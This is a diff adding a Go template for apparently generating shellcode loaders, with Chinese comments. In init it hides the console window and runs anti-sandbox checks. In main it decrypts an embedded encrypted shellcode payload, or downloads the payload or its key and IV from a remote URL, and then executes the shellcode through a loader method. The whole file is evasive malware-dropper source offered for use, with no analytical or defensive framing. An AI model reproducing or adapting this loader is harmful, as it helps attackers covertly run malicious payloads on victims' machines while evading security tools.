@@ -1,0 +1,98 @@
+package main
+
+import (
+    "variant/crypto"
+    "variant/loader"
+
+    {{if .Compressor}}
+        "{{.Compressor.Import}}"
+    {{end}}
+
+	{{if .Dynamic}}
+         "{{.Dynamic.Import}}"
+    {{end}}
+
+	{{if .SandBox}}
+	    "{{.SandBox.Import}}"
+	{{end}}
+
+	{{if .Args}}
+    	 "{{.Args.Import}}"
+    {{end}}
+)
+
+func init() {
+    {{/* 代码层面隐藏CMD */}}
+    {{if .Loader.Hide}}
+	    {{.Loader.Hide}}()
+    {{end}}
+
+    {{/* 反沙箱 */}}
+	{{if .SandBox}}
+        {{range .SandBox.Methods}}
+            {{.}}()
+	    {{end}}
+	{{end}}
+}
+
+func main() {
+    {{/* 是否为本地加载模式 */}}
+    {{if .Local}}
+        {{/* 是否为硬编码, 如有存在 Local.KeyName 则渲染 */}}
+        {{if .Local.KeyName}}
+            {{.Local.KeyName}} := []byte("{{.Local.KeyValue}}")
+        {{end}}
+    {{end}}
+
+    {{/* 是否为动态 Key */}}
+    {{if .Dynamic}}
+        {{.Dynamic.DynamicKey}} := {{.Dynamic.DynamicMethod}}("{{.Dynamic.DynamicUrl}}",{{.Dynamic.KeyStart}},{{.Dynamic.KeyEnd}})
+    {{end}}
+
+    {{/* Key 压缩算法 */}}
+    {{if .Compressor}}
+        {{- .KeyName}}, _ = {{.Compressor.Algorithm}}({{.KeyName}}, {{.Compressor.Ratio}})
+    {{end}}
+
+    {{/* 是否为本地加载模式 */}}
+    {{if .Local}}
+        {{/* 是否为硬编码, 如有存在 Local.KeyName 则渲染 */}}
+        {{if .Local.IvName}}
+            {{.Local.IvName}}  := []byte("{{.Local.IvValue}}")
+                {{/* IV 压缩算法 */}}
+                {{if .Compressor}}
+                    {{.Local.IvName}}, _ = {{.Compressor.Algorithm}}({{.Local.IvName}}, {{.Compressor.Ratio}})
+                {{end}}
+        {{end}}
+    {{end}}
+
+    {{/* 是否为动态 IV */}}
+    {{if .Dynamic}}
+        {{.Dynamic.DynamicIV}} := {{.Dynamic.DynamicMethod}}("{{.Dynamic.DynamicUrl}}",{{.Dynamic.IVStart}},{{.Dynamic.IVEnd}})
+    {{end}}
+
+    {{/* 加密之后的 shellcode 是否需要压缩 IV */}}
+    {{if .Compressor}}
+        {{.CipherText}}, _ = {{.Compressor.Algorithm}}("{{.Payload}}", {{.Compressor.Ratio}})
+    {{end}}
+
+    {{/* 本地加载 */}}
+    {{if .Local}}
+        {{.CipherText}} := "{{.Payload}}"
+        {{.PlainText}}, _ := {{.DecryptMethod}}({{.CipherText}}, {{.Local.KeyName}} {{if .Local.IvName}}, {{.Local.IvName}}{{end}})
+    {{end}}
+
+    {{/* 远程加载 */}}
+    {{if .Remote}}
+        {{.Remote.UrlName}} := "{{.Remote.Url}}"
+        {{.CipherText}}, _ := {{.Remote.Method}}({{.Remote.UrlName}})
+    {{end}}
+
+    {{/* 动态数据 */}}
+    {{if .Dynamic}}
+        {{.PlainText}}, _ := {{.DecryptMethod}}({{.CipherText}}, {{.Dynamic.DynamicKey}} {{if .Dynamic.DynamicIV}}, {{.Dynamic.DynamicIV}} {{end}})
+    {{end}}
+
+    {{/* 执行 shellcode */}}
+    {{.Loader.Method}}({{.PlainText}})
+}
